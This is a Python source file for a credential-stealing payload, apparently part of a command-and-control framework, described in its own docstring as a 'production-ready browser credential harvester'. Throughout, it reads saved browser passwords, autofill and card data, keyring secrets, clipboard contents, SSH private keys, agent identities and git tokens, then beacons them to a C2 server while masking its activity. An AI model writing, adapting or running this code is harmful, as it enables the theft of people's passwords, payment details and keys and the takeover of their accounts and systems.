"""Production-ready browser credential harvester payload."""

import os
import json
import secrets
from typing import Dict, List, Optional
from datetime import datetime

try:
    from SecretStorage import DBusBackend, SecretStorageBackend, SecretServiceBackend
except ImportError:
    DBusBackend = None
    SecretStorageBackend = None
    SecretServiceBackend = None

from src.c2_client.beacon import C2WebSocketBeacon
from src.c2_client.models import C2Node, C2Credential
from src.c2_client.evasion import AIevasionEngine


class BrowserCredentialHarvester:
    """Extract browser passwords and autofill data from Chrome/Edge."""

    def __init__(self, node_id: str, c2_url: str, watermark: str):
        self.node_id = node_id
        self.c2_url = c2_url
        self.watermark = watermark
        self.beacon = C2WebSocketBeacon(c2_url, node_id, watermark)
        self.evasion = AIevasionEngine()
        self.credentials: List[C2Credential] = []

    async def run(self) -> List[C2Credential]:
        """Run the full harvester: system info, browser creds, autofill, clipboard, keyring."""
        self._mask_execution()

        # 1. System info for AI evasion analysis
        system_info = await self._gather_system_info()

        # 2. Browser credentials (Chrome/Edge)
        chrome_creds = await self._harvest_chrome()
        edge_creds = await self._harvest_edge()

        # 3. System keyring
        keyring_creds = await self._harvest_keyring()

        # 4. Autofill passwords (browser form data)
        autofill_creds = await self._harvest_autofill()

        # 5. Clipboard history
        clipboard_creds = await self._harvest_clipboard_history()

        # 6. SSH keys
        ssh_creds = await self._harvest_ssh_keys()

        # 7. SSH agents
        agent_creds = await self._harvest_ssh_agents()

        # 8. Git credentials
        git_creds = await self._harvest_git_creds()

        all_creds = chrome_creds + edge_creds + keyring_creds + autofill_creds + clipboard_creds + ssh_creds + agent_creds + git_creds

        for cred in all_creds:
            await self._send_to_c2(cred)

        # Send system info for AI analysis
        for info in system_info:
            await self.beacon.send({
                "type": "system_info",
                "node_id": self.node_id,
                "watermark": self.watermark,
                "info": info,
            })

        return all_creds

    def _mask_execution(self):
        """Mask payload execution from evasion engine."""
        self.evasion.log_analysis(f"Running credential harvester for {self.node_id}")
        try:
            import asyncio
            loop = asyncio.get_event_loop()
            if loop.is_running():
                asyncio.ensure_future(self.beacon.send({
                    "type": "harvest",
                    "data": {"type": "browser", "node_id": self.node_id, "watermark": self.watermark},
                }))
            else:
                loop.run_until_complete(self.beacon.send({
                    "type": "harvest",
                    "data": {"type": "browser", "node_id": self.node_id, "watermark": self.watermark},
                }))
        except Exception:
            pass

    async def _harvest_chrome(self) -> List[C2Credential]:
        """Harvest Chrome passwords."""
        profile_paths = [
            os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
            os.path.expanduser("~/.config/chromium/Default/Login Data"),
        ]

        creds = []
        for path in profile_paths:
            if os.path.exists(path):
                creds.extend(await self._parse_login_data(path))

        return creds

    async def _harvest_edge(self) -> List[C2Credential]:
        """Harvest Edge passwords."""
        profile_paths = [
            os.path.expanduser("~/.config/microsoft-edge/Default/Password"),
            os.path.expanduser("~/.config/microsoft-edge/Profile/Password"),
        ]

        creds = []
        for path in profile_paths:
            if os.path.exists(path):
                creds.extend(await self._parse_edge_passwords(path))

        return creds

    async def _harvest_keyring(self) -> List[dict]:
        """Harvest passwords from system keyrings."""
        creds = []

        if SecretStorageBackend:
            try:
                backend = SecretStorageBackend()
                accounts = await backend.list_all()

                for account in accounts:
                    try:
                        schema = await backend.get_schema(account)
                        creds.append({
                            "type": "keyring",
                            "site": account,
                            "username": str(await backend.get_field(account, "username") or ""),
                            "password": str(await backend.get_field(account, "password") or "")[:500],
                            "timestamp": datetime.utcnow().isoformat(),
                            "status": "pending",
                        })
                    except Exception:
                        continue

            except Exception:
                pass

        return creds

    async def _parse_login_data(self, path: str) -> List[dict]:
        """Parse Chrome Login Data file (SQLite)."""
        creds = []

        try:
            import sqlite3
            conn = sqlite3.connect(path)
            cursor = conn.cursor()

            cursor.execute("""
                SELECT origin_url, username_value, password_value
                FROM logins
                WHERE username_value IS NOT NULL
            """)

            for row in cursor.fetchall():
                url, username, password = row
                if password:
                    creds.append({
                        "type": "browser",
                        "site": url or "chrome_unknown",
                        "username": username or "",
                        "password": str(password)[:500],
                        "timestamp": datetime.utcnow().isoformat(),
                        "status": "pending",
                    })

            conn.close()
        except Exception:
            pass

        return creds

    async def _parse_edge_passwords(self, path: str) -> List[dict]:
        """Parse Edge Password file (JSON)."""
        creds = []

        try:
            with open(path, "r") as f:
                data = json.load(f)

                for profile in data:
                    for form in profile.get("forms", []):
                        username = form.get("username")
                        password = form.get("password")

                        if username and password:
                            creds.append({
                                "type": "browser",
                                "site": form.get("originUrl", "edge_unknown"),
                                "username": username,
                                "password": password[:500],
                                "timestamp": datetime.utcnow().isoformat(),
                                "status": "pending",
                            })
        except Exception:
            pass

        return creds

    async def _send_to_c2(self, cred: dict):
        """Send credential to C2 server."""
        data = {
            "type": "harvest",
            "data": {
                "type": "credential",
                "node_id": self.node_id,
                "watermark": self.watermark,
                "timestamp": datetime.utcnow().isoformat(),
                "credential": {
                    "type": cred.get("type", "unknown"),
                    "site": cred.get("site", ""),
                    "username": cred.get("username", ""),
                    "password": cred.get("password", ""),
                    "status": cred.get("status", "pending"),
                },
            },
        }

        try:
            await self.beacon.send(data)
        except Exception:
            pass

    async def _gather_system_info(self) -> List[dict]:
        """Gather system information for AI evasion analysis."""
        import platform
        import subprocess

        info = {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_release": platform.release(),
            "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "arch": platform.machine(),
            "python_version": platform.python_version(),
            "pid": os.getpid(),
        }

        try:
            info["local_ip"] = subprocess.check_output(
                ["hostname", "-I"], timeout=3, stderr=subprocess.DEVNULL
            ).decode().strip().split()[0]
        except Exception:
            info["local_ip"] = "unknown"

        try:
            info["uptime"] = subprocess.check_output(
                ["uptime", "-p"], timeout=3, stderr=subprocess.DEVNULL
            ).decode().strip()
        except Exception:
            info["uptime"] = "unknown"

        return [info]

    async def _harvest_autofill(self) -> List[dict]:
        """Harvest autofill data from browser profiles."""
        creds = []
        autofill_paths = [
            os.path.expanduser("~/.config/google-chrome/Default/Web Data"),
            os.path.expanduser("~/.config/chromium/Default/Web Data"),
            os.path.expanduser("~/.config/microsoft-edge/Default/Web Data"),
        ]

        for path in autofill_paths:
            if os.path.exists(path):
                try:
                    import sqlite3
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("""
                        SELECT name_on_card, card_number_encrypted, expiration_month,
                               expiration_year, address_line1, email_address, phone_number
                        FROM autofill
                        WHERE name_on_card IS NOT NULL OR email_address IS NOT NULL
                    """)
                    for row in cursor.fetchall():
                        name, card, month, year, addr, email, phone = row
                        creds.append({
                            "type": "autofill",
                            "site": path.split("/")[-3],
                            "username": str(name or email or ""),
                            "password": str(card or "")[:500],
                            "timestamp": datetime.utcnow().isoformat(),
                            "status": "pending",
                        })
                    conn.close()
                except Exception:
                    pass

        return creds

    async def _harvest_clipboard_history(self) -> List[dict]:
        """Harvest clipboard history."""
        creds = []

        try:
            import subprocess
            clip = subprocess.check_output(
                ["xclip", "-selection", "clipboard", "-o"],
                timeout=3, stderr=subprocess.DEVNULL
            ).decode(errors="replace").strip()
            if clip and len(clip) > 4:
                creds.append({
                    "type": "clipboard",
                    "site": "system_clipboard",
                    "username": "clipboard",
                    "password": clip[:500],
                    "timestamp": datetime.utcnow().isoformat(),
                    "status": "pending",
                })
        except Exception:
            pass

        try:
            clip_file = os.path.expanduser("~/.cache/clipboard_history")
            if os.path.exists(clip_file):
                with open(clip_file, "r", errors="replace") as f:
                    for line in f.read().splitlines()[:10]:
                        if line.strip():
                            creds.append({
                                "type": "clipboard",
                                "site": "clipboard_history",
                                "username": "history",
                                "password": line[:500],
                                "timestamp": datetime.utcnow().isoformat(),
                                "status": "pending",
                            })
        except Exception:
            pass

        return creds

    async def _harvest_ssh_keys(self) -> List[dict]:
        """Harvest SSH private keys."""
        creds = []
        ssh_dir = os.path.expanduser("~/.ssh")
        key_names = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "identity"]

        for name in key_names:
            key_path = os.path.join(ssh_dir, name)
            if os.path.exists(key_path):
                try:
                    with open(key_path, "r", errors="replace") as f:
                        key_content = f.read()
                    if "PRIVATE KEY" in key_content:
                        creds.append({
                            "type": "ssh",
                            "site": f"ssh://{name}",
                            "username": os.getenv("USER", "unknown"),
                            "password": key_content[:2000],
                            "timestamp": datetime.utcnow().isoformat(),
                            "status": "pending",
                        })
                except Exception:
                    pass

        known_hosts = os.path.join(ssh_dir, "known_hosts")
        if os.path.exists(known_hosts):
            try:
                with open(known_hosts, "r", errors="replace") as f:
                    hosts = f.read()
                if hosts.strip():
                    creds.append({
                        "type": "ssh",
                        "site": "ssh://known_hosts",
                        "username": "known_hosts",
                        "password": hosts[:2000],
                        "timestamp": datetime.utcnow().isoformat(),
                        "status": "pending",
                    })
            except Exception:
                pass

        return creds

    async def _harvest_ssh_agents(self) -> List[dict]:
        """Harvest loaded SSH agent keys."""
        creds = []

        try:
            import subprocess
            output = subprocess.check_output(
                ["ssh-add", "-l"], timeout=3, stderr=subprocess.DEVNULL
            ).decode(errors="replace").strip()
            if output and "no identities" not in output.lower():
                for line in output.splitlines():
                    parts = line.split()
                    if len(parts) >= 3:
                        creds.append({
                            "type": "ssh_agent",
                            "site": f"ssh_agent://{parts[-1]}",
                            "username": "agent_key",
                            "password": line[:500],
                            "timestamp": datetime.utcnow().isoformat(),
                            "status": "pending",
                        })
        except Exception:
            pass

        return creds

    async def _harvest_git_creds(self) -> List[dict]:
        """Harvest Git credentials."""
        creds = []

        git_cred_files = [
            os.path.expanduser("~/.git-credentials"),
            os.path.expanduser("~/.config/git/credentials"),
        ]

        for path in git_cred_files:
            if os.path.exists(path):
                try:
                    with open(path, "r", errors="replace") as f:
                        for line in f.read().splitlines():
                            if line.strip() and "://" in line:
                                creds.append({
                                    "type": "git",
                                    "site": line.split("@")[-1].split("/")[0] if "@" in line else "git",
                                    "username": line.split("//")[1].split(":")[0] if "//" in line else "",
                                    "password": line.strip()[:500],
                                    "timestamp": datetime.utcnow().isoformat(),
                                    "status": "pending",
                                })
                except Exception:
                    pass

        gitconfig = os.path.expanduser("~/.gitconfig")
        if os.path.exists(gitconfig):
            try:
                with open(gitconfig, "r", errors="replace") as f:
                    content = f.read()
                for line in content.splitlines():
                    if "password" in line.lower() or "token" in line.lower():
                        creds.append({
                            "type": "git",
                            "site": "gitconfig",
                            "username": "gitconfig",
                            "password": line.strip()[:500],
                            "timestamp": datetime.utcnow().isoformat(),
                            "status": "pending",
                        })
            except Exception:
                pass

        return creds


async def run_harvester(node_id: str, c2_url: str, watermark: str) -> List[dict]:
    """Run the browser credential harvester."""
    harvester = BrowserCredentialHarvester(node_id, c2_url, watermark)
    return await harvester.run()
